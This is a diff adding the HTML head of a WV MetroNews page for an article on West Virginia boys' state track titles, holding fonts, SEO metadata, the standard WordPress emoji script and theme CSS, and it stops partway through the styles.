@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="profile" href="https://gmpg.org/xfn/11">
+    <link rel="pingback" href="https://wvmetronews.com/xmlrpc.php">
+    <style type="text/css">@font-face {font-family:'Cabin';font-style:normal;font-weight:400;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/400/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:400;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/400/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:400;src:url(/cf-fonts/s/cabin/5.2.8/latin/400/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:400;src:url(/cf-fonts/s/cabin/5.2.8/latin/400/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:400;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/400/italic.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:400;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/400/italic.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:500;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/500/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:500;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/500/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:500;src:url(/cf-fonts/s/cabin/5.2.8/latin/500/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:500;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/500/italic.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:500;src:url(/cf-fonts/s/cabin/5.2.8/latin/500/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:500;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/500/italic.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:600;src:url(/cf-fonts/s/cabin/5.2.8/latin/600/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:600;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/600/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:600;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/600/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:600;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/600/italic.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:600;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/600/italic.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:600;src:url(/cf-fonts/s/cabin/5.2.8/latin/600/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:700;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/700/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:700;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/700/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'Cabin';font-style:normal;font-weight:700;src:url(/cf-fonts/s/cabin/5.2.8/latin/700/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:700;src:url(/cf-fonts/s/cabin/5.2.8/latin/700/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:700;src:url(/cf-fonts/s/cabin/5.2.8/vietnamese/700/italic.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:'Cabin';font-style:italic;font-weight:700;src:url(/cf-fonts/s/cabin/5.2.8/latin-ext/700/italic.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}</style>
+    <style type="text/css">@font-face {font-family:'PT Serif';font-style:normal;font-weight:400;src:url(/cf-fonts/s/pt-serif/5.2.8/latin/400/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:400;src:url(/cf-fonts/s/pt-serif/5.2.8/latin-ext/400/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:400;src:url(/cf-fonts/s/pt-serif/5.2.8/cyrillic/400/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:400;src:url(/cf-fonts/s/pt-serif/5.2.8/cyrillic-ext/400/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:700;src:url(/cf-fonts/s/pt-serif/5.2.8/cyrillic/700/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:700;src:url(/cf-fonts/s/pt-serif/5.2.8/latin-ext/700/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:700;src:url(/cf-fonts/s/pt-serif/5.2.8/latin/700/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'PT Serif';font-style:normal;font-weight:700;src:url(/cf-fonts/s/pt-serif/5.2.8/cyrillic-ext/700/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}</style>
+    <!-- <link rel="stylesheet" href="https://use.typekit.net/cyl7hat.css"> -->
+    <link rel="stylesheet" href="https://prebid.mpwdigital.com/wvmetronews/stickyad.css">
+
+    <!-- <script src="https://kit.fontawesome.com/1d871c191d.js" crossorigin="anonymous"></script> -->
+
+    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v23.7 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Boys State Track: Huntington &amp; Morgantown share Class AAAA title; Doddridge defends in Class AA - WV MetroNews</title>
+	<link rel="canonical" href="https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Boys State Track: Huntington &amp; Morgantown share Class AAAA title; Doddridge defends in Class AA - WV MetroNews" />
+	<meta property="og:description" content="Point Pleasant (Class AAA) and Wahama (Class A) also won team titles." />
+	<meta property="og:url" content="https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/" />
+	<meta property="og:site_name" content="WV MetroNews" />
+	<meta property="article:publisher" content="https://www.facebook.com/WVMetroNews" />
+	<meta property="article:published_time" content="2026-05-24T00:21:51+00:00" />
+	<meta property="og:image" content="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/0F4A6842-490x327.jpg" />
+	<meta property="og:image:width" content="490" />
+	<meta property="og:image:height" content="327" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta name="author" content="Joe Brocato" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@joebrowvm" />
+	<meta name="twitter:site" content="@WVMetroNews" />
+	<meta name="twitter:label1" content="Written by" />
+	<meta name="twitter:data1" content="Joe Brocato" />
+	<meta name="twitter:label2" content="Est. reading time" />
+	<meta name="twitter:data2" content="4 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#article","isPartOf":{"@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/"},"author":{"name":"Joe Brocato","@id":"https://tk-wv-metro.beforewegolive.dev/#/schema/person/15a64d685851f4441c1ebe697532302b"},"headline":"Boys State Track: Huntington &#038; Morgantown share Class AAAA title; Doddridge defends in Class AA","datePublished":"2026-05-24T00:21:51+00:00","dateModified":"2026-05-24T00:21:51+00:00","mainEntityOfPage":{"@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/"},"wordCount":735,"publisher":{"@id":"https://tk-wv-metro.beforewegolive.dev/#organization"},"image":{"@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#primaryimage"},"thumbnailUrl":"https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/0F4A6842.jpg","articleSection":["High School Sports","Sports"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/","url":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/","name":"Boys State Track: Huntington & Morgantown share Class AAAA title; Doddridge defends in Class AA - WV MetroNews","isPartOf":{"@id":"https://tk-wv-metro.beforewegolive.dev/#website"},"primaryImageOfPage":{"@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#primaryimage"},"image":{"@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#primaryimage"},"thumbnailUrl":"https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/0F4A6842.jpg","datePublished":"2026-05-24T00:21:51+00:00","dateModified":"2026-05-24T00:21:51+00:00","breadcrumb":{"@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#primaryimage","url":"https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/0F4A6842.jpg","contentUrl":"https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/0F4A6842.jpg","width":2048,"height":1365},{"@type":"BreadcrumbList","@id":"https://wvmetronews.com/2026/05/23/boys-state-track-huntington-doddridge-defends-in-class-aa/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://tk-wv-metro.beforewegolive.dev/"},{"@type":"ListItem","position":2,"name":"Boys State Track: Huntington &#038; Morgantown share Class AAAA title; Doddridge defends in Class AA"}]},{"@type":"WebSite","@id":"https://tk-wv-metro.beforewegolive.dev/#website","url":"https://tk-wv-metro.beforewegolive.dev/","name":"WV MetroNews","description":"The Voice of West Virginia","publisher":{"@id":"https://tk-wv-metro.beforewegolive.dev/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://tk-wv-metro.beforewegolive.dev/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https://tk-wv-metro.beforewegolive.dev/#organization","name":"WV MetroNews","alternateName":"WV MetroNews: The Voice of West Virginia","url":"https://tk-wv-metro.beforewegolive.dev/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://tk-wv-metro.beforewegolive.dev/#/schema/logo/image/","url":"https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/09/metronews-vimei-logo.png","contentUrl":"https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/09/metronews-vimei-logo.png","width":600,"height":600,"caption":"WV MetroNews"},"image":{"@id":"https://tk-wv-metro.beforewegolive.dev/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/WVMetroNews","https://x.com/WVMetroNews"]},{"@type":"Person","@id":"https://tk-wv-metro.beforewegolive.dev/#/schema/person/15a64d685851f4441c1ebe697532302b","name":"Joe Brocato","description":"Joe Brocato has covered sports at various levels in West Virginia for seventeen years. As sports director at WDTV in Bridgeport, he coordinated coverage of WVU, Division 2 and high school sports throughout North Central West Virginia. Joe also was a sports reporter/anchor in Laredo, Texas.","sameAs":["https://x.com/@joebrowvm"],"url":"https://wvmetronews.com/author/jbrocato/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel="alternate" type="application/rss+xml" title="WV MetroNews &raquo; Feed" href="https://wvmetronews.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="WV MetroNews &raquo; Comments Feed" href="https://wvmetronews.com/comments/feed/" />
+<script type="d157fd38a32685cc840424ab-text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/wvmetronews.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.8"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://wvmetronews.com/wp-includes/css/dist/block-library/style.min.css?ver=6.6.8' type='text/css' media='all' />
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) 